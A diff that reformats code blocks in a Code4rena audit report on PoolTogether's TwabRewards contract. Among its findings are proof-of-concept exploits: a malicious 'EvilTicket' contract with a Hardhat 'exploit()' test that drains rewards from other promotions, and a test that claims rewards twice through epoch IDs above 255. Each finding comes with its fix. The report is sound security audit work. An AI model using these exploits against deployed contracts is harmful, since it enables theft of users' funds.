@@ -84,7 +84,7 @@ _Submitted by WatchPug_
 
 <https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L88-L116>
 
-```solidity=88
+```solidity
 function createPromotion(
     address _ticket,
     IERC20 _token,
@@ -170,18 +170,18 @@ This can lead to loss of funds as there is no recovery function of funds stuck l
 #### Recommended Mitigation Steps
 
 Add below check in the `createPromotion` function
-
-    function createPromotion(
-            address _ticket,
-            IERC20 _token,
-            uint216 _tokensPerEpoch,
-            uint32 _startTimestamp,
-            uint32 _epochDuration,
-            uint8 _numberOfEpochs
-        ) external override returns (uint256) {
+```solidity
+function createPromotion(
+    address _ticket,
+    IERC20 _token,
+    uint216 _tokensPerEpoch,
+    uint32 _startTimestamp,
+    uint32 _epochDuration,
+    uint8 _numberOfEpochs
+) external override returns (uint256) {
     require(_startTimestamp>block.timestamp,"should be after current time");
-    }
-
+}
+```
 **[PierrickGT (PoolTogether) confirmed and disagreed with severity](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/8#issuecomment-990391447):**
  > It would indeed be an unfortunate event and we will implement this require. That being said, funds of the promotion creator would be at risk, because of an error he made, but not funds of a user, so I consider this bug as being of severity 2 (Med Risk) and not 3 (High Risk).
 
@@ -202,7 +202,7 @@ _Submitted by gpersoon, also found by 0xabc, csanuragjain, harleythedog, kenzo, 
 When claiming rewards via `claimRewards()`, the function `\_calculateRewardAmount()` is called.
 The function `\_calculateRewardAmount()` has a check to make sure the epoch is over
 
-```JS
+```solidity
   require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over"); 
 ```
 
@@ -221,7 +221,7 @@ When run in remix you get the following output, while there is only 1 epoch.
 
 #### Proof of Concept
 
-```JS
+```solidity
  // SPDX-License-Identifier: GPL-3.0
 pragma solidity 0.8.6;
 import "hardhat/console.sol";  
@@ -338,12 +338,12 @@ It also means all the unclaimed tokens (of the previous epochs) will stay locked
 
 <https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L119-L138>
 
-```JS
+```solidity
 function cancelPromotion(uint256 _promotionId, address _to) ... {
-       ...
-        uint256 _remainingRewards = _getRemainingRewards(_promotion);
-        delete _promotions[_promotionId];
-       
+    ...
+    uint256 _remainingRewards = _getRemainingRewards(_promotion);
+    delete _promotions[_promotionId];
+    
 ```
 
 #### Recommended Mitigation Steps
@@ -380,69 +380,70 @@ The attacker receives the tokens of other promotions without having spent anythi
 #### Proof of Concept
 
 The malicious smart contract is a copy/paste of [TicketHarness.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/test/TicketHarness.sol) and [Ticket.sol](https://github.com/pooltogether/v4-core/blob/master/contracts/Ticket.sol) with the following changes:
+```solidity
+/// @inheritdoc ITicket
+function getAverageTotalSuppliesBetween(
+    uint64[] calldata _startTimes,
+    uint64[] calldata _endTimes
+) external view override returns (uint256[] memory) {
+    uint256[] memory _balances = new uint256[](1);
+    _balances[0] = uint256(1);
+    return _balances;
+}
 
-        /// @inheritdoc ITicket
-        function getAverageTotalSuppliesBetween(
-            uint64[] calldata _startTimes,
-            uint64[] calldata _endTimes
-        ) external view override returns (uint256[] memory) {
-            uint256[] memory _balances = new uint256[](1);
-            _balances[0] = uint256(1);
-            return _balances;
-        }
-
-        /// @inheritdoc ITicket
-        function getAverageBalanceBetween(
-            address _user,
-            uint64 _startTime,
-            uint64 _endTime
-        ) external view override returns (uint256) {
-            return 1337;
-        }
+/// @inheritdoc ITicket
+function getAverageBalanceBetween(
+    address _user,
+    uint64 _startTime,
+    uint64 _endTime
+) external view override returns (uint256) {
+    return 1337;
+}
+```
 
 The test for HardHat is:
+```js
+describe('exploit()', async () => {
+    it('this shouldnt happen', async () => {
+        const promotionIdOne = 1;
+        const promotionIdTwo = 2;
 
-        describe('exploit()', async () => {
-            it('this shouldnt happen', async () => {
-                const promotionIdOne = 1;
-                const promotionIdTwo = 2;
+        await expect(createPromotion(ticket.address))
+            .to.emit(twabRewards, 'PromotionCreated')
+            .withArgs(promotionIdOne);
+        
+        let evilTicketFactory = await getContractFactory('EvilTicket');
+        let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);
+        let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
+        await expect(twabRewards.connect(wallet2).createPromotion(
+            evilTicket.address,
+            rewardToken.address,
+            tokensPerEpoch,
+            createPromotionTimestamp,
+            1,//epochDuration,
+            0,//epochsNumber,
+        )).to.emit(twabRewards, 'PromotionCreated')
+            .withArgs(promotionIdTwo);
 
-                await expect(createPromotion(ticket.address))
-                    .to.emit(twabRewards, 'PromotionCreated')
-                    .withArgs(promotionIdOne);
-                
-                let evilTicketFactory = await getContractFactory('EvilTicket');
-                let evilTicket = await evilTicketFactory.deploy('EvilTicket', 'TICK', 18, wallet1.address);
-                let createPromotionTimestamp = (await ethers.provider.getBlock('latest')).timestamp;
-                await expect(twabRewards.connect(wallet2).createPromotion(
-                    evilTicket.address,
-                    rewardToken.address,
-                    tokensPerEpoch,
-                    createPromotionTimestamp,
-                    1,//epochDuration,
-                    0,//epochsNumber,
-                )).to.emit(twabRewards, 'PromotionCreated')
-                  .withArgs(promotionIdTwo);
-
-                await increaseTime(100);
-                const epochIds = ['100'];
-                await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);
-            });
-        });
-
+        await increaseTime(100);
+        const epochIds = ['100'];
+        await twabRewards.connect(wallet2).claimRewards(wallet2.address, promotionIdTwo, epochIds);
+    });
+});
+```
 It results in the following error:
-
-     1) TwabRewards
-           exploit()
-             this shouldnt happen:
-         Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'
-          at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)
-          at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)
-          at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)
-          at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)
-          at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)
-          at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)
-
+```
+1) TwabRewards
+    exploit()
+        this shouldnt happen:
+    Error: VM Exception while processing transaction: reverted with reason string 'ERC20: transfer amount exceeds balance'
+    at TwabRewardsHarness.verifyCallResult (@openzeppelin/contracts/utils/Address.sol:209)
+    at TwabRewardsHarness.functionCallWithValue (@openzeppelin/contracts/utils/Address.sol:132)
+    at TwabRewardsHarness.functionCall (@openzeppelin/contracts/utils/Address.sol:94)
+    at TwabRewardsHarness._callOptionalReturn (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:92)
+    at TwabRewardsHarness.safeTransfer (@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol:25)
+    at TwabRewardsHarness.claimRewards (contracts/TwabRewards.sol:186)
+```
 #### Recommended Mitigation Steps
 
 Maybe add a whitelist of trusted tickets?
@@ -459,19 +460,19 @@ An attacker can claim its reward 256 \* `epochDuration` seconds after the timest
 #### Analysis
 
 `claimRewards()` claim rewards for a given promotion and epoch. In order to prevent a user from claiming a reward multiple times, the mapping [\_claimedEpochs](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L32) keeps track of claimed rewards per user:
-
-        /// @notice Keeps track of claimed rewards per user.
-        /// @dev _claimedEpochs[promotionId][user] => claimedEpochs
-        /// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.
-        mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;
-
+```solidity
+/// @notice Keeps track of claimed rewards per user.
+/// @dev _claimedEpochs[promotionId][user] => claimedEpochs
+/// @dev We pack epochs claimed by a user into a uint256. So we can't store more than 255 epochs.
+mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;
+```
 (The comment is wrong, epochs are packed into a uint256 which allows **256** epochs to be stored).
 
 `_epochIds` is an array of `uint256`. For each `_epochId` in this array, `claimRewards()` checks that the reward associated to this `_epochId` isn't already claimed thanks to
 `_isClaimedEpoch()`. [\_isClaimedEpoch()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L371) checks that the bit `_epochId` of `_claimedEpochs` is unset:
-
-    (_userClaimedEpochs >> _epochId) & uint256(1) == 1;
-
+```solidity
+(_userClaimedEpochs >> _epochId) & uint256(1) == 1;
+```
 However, if `_epochId` is greater than 255, `_isClaimedEpoch()` always returns false. It allows an attacker to claim a reward several times.
 
 [\_calculateRewardAmount()](https://github.com/pooltogether/v4-periphery/blob/ceadb25844f95f19f33cb856222e461ed8edf005/contracts/TwabRewards.sol#L289) just makes use of `_epochId` to tell whether the promotion is over.
@@ -479,24 +480,24 @@ However, if `_epochId` is greater than 255, `_isClaimedEpoch()` always returns f
 #### Proof of Concept
 
 The following test should result in a reverted transaction, however the transaction succeeds.
+```js
+it('should fail to claim rewards if one or more epochs have already been claimed', async () => {
+    const promotionId = 1;
 
-            it('should fail to claim rewards if one or more epochs have already been claimed', async () => {
-                const promotionId = 1;
+    const wallet2Amount = toWei('750');
+    const wallet3Amount = toWei('250');
 
-                const wallet2Amount = toWei('750');
-                const wallet3Amount = toWei('250');
+    await ticket.mint(wallet2.address, wallet2Amount);
+    await ticket.mint(wallet3.address, wallet3Amount);
 
-                await ticket.mint(wallet2.address, wallet2Amount);
-                await ticket.mint(wallet3.address, wallet3Amount);
+    await createPromotion(ticket.address);
+    await increaseTime(epochDuration * 257);
 
-                await createPromotion(ticket.address);
-                await increaseTime(epochDuration * 257);
-
-                await expect(
-                    twabRewards.claimRewards(wallet2.address, promotionId, ['256', '256']),
-                ).to.be.revertedWith('TwabRewards/rewards-already-claimed');
-            });
-
+    await expect(
+        twabRewards.claimRewards(wallet2.address, promotionId, ['256', '256']),
+    ).to.be.revertedWith('TwabRewards/rewards-already-claimed');
+});
+```
 #### Recommended Mitigation Steps
 
 A possible fix could be to change the type of `_epochId` to `uint8` in:
@@ -527,11 +528,12 @@ rewards for users claiming later than others.
 
 To disable fee-on transfer tokens for the contract, add the following code in
 `createPromotion` around line 11:
-
-    uint256 oldBalance = _token.balanceOf(address(this));
-    _token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);
-    uint256 newBalance = _token.balanceOf(address(this));
-    require(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance);
+```solidity
+uint256 oldBalance = _token.balanceOf(address(this));
+_token.safeTransferFrom(msg.sender, address(this), _tokensPerEpoch * _numberOfEpochs);
+uint256 newBalance = _token.balanceOf(address(this));
+require(oldBalance + _tokenPerEpoch * _numberOfEpochs == newBalance);
+```
 
 **[PierrickGT (PoolTogether) confirmed](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/30)**
 
@@ -555,7 +557,7 @@ Call stack: `cancelPromotion()` -> `_getRemainingRewards()` -> `_getCurrentEpoch
 
 <https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L331-L336>
 
-```solidity=331
+```solidity
 function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {
     // _tokensPerEpoch * _numberOfEpochsLeft
     return
@@ -566,7 +568,7 @@ function _getRemainingRewards(Promotion memory _promotion) internal view returns
 
 <https://github.com/pooltogether/v4-periphery/blob/0e94c54774a6fce29daf9cb23353208f80de63eb/contracts/TwabRewards.sol#L276-L279>
 
-```solidity=276
+```solidity
 function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {
     // elapsedTimestamp / epochDurationTimestamp
     return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration;
@@ -593,8 +595,9 @@ However, no such check is done in the implementation of `getRewardsAmount`. This
 See the implementation of `getRewardsAmount` here: <https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L209>
 
 Notice that there are no checks that the epochs have not already been claimed. Compare this to `claimRewards` which *does* check for epochs that have already been claimed with the following require statement:
-
-    require(!_isClaimedEpoch(_userClaimedEpochs, _epochId), "TwabRewards/rewards-already-claimed");
+```solidity
+require(!_isClaimedEpoch(_userClaimedEpochs, _epochId), "TwabRewards/rewards-already-claimed");
+```
 
 A similar check should be added `getRewardsAmount` so that previously claimed epochs are not included in the sum.
 
@@ -669,37 +672,38 @@ However, there may be inaccuracies in the `_calculateRewardAmount` function, whi
 #### Proof of Concept
 
 <https://github.com/pooltogether/v4-periphery/blob/b520faea26bcf60371012f6cb246aa149abd3c7d/contracts/TwabRewards.sol#L162-L191>
+```solidity
+function claimRewards(
+    address _user,
+    uint256 _promotionId,
+    uint256[] calldata _epochIds
+) external override returns (uint256) {
+    Promotion memory _promotion = _getPromotion(_promotionId);
 
-        function claimRewards(
-            address _user,
-            uint256 _promotionId,
-            uint256[] calldata _epochIds
-        ) external override returns (uint256) {
-            Promotion memory _promotion = _getPromotion(_promotionId);
+    uint256 _rewardsAmount;
+    uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];
 
-            uint256 _rewardsAmount;
-            uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];
+    for (uint256 index = 0; index < _epochIds.length; index++) {
+        uint256 _epochId = _epochIds[index];
 
-            for (uint256 index = 0; index < _epochIds.length; index++) {
-                uint256 _epochId = _epochIds[index];
+        require(
+            !_isClaimedEpoch(_userClaimedEpochs, _epochId),
+            "TwabRewards/rewards-already-claimed"
+        );
 
-                require(
-                    !_isClaimedEpoch(_userClaimedEpochs, _epochId),
-                    "TwabRewards/rewards-already-claimed"
-                );
+        _rewardsAmount += _calculateRewardAmount(_user, _promotion, _epochId);
+        _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);
+    }
 
-                _rewardsAmount += _calculateRewardAmount(_user, _promotion, _epochId);
-                _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);
-            }
+    _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;
 
-            _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;
+    _promotion.token.safeTransfer(_user, _rewardsAmount);
 
-            _promotion.token.safeTransfer(_user, _rewardsAmount);
+    emit RewardsClaimed(_promotionId, _epochIds, _user, _rewardsAmount);
 
-            emit RewardsClaimed(_promotionId, _epochIds, _user, _rewardsAmount);
-
-            return _rewardsAmount;
-        }
+    return _rewardsAmount;
+}
+```
 
 #### Recommended Mitigation Steps
 
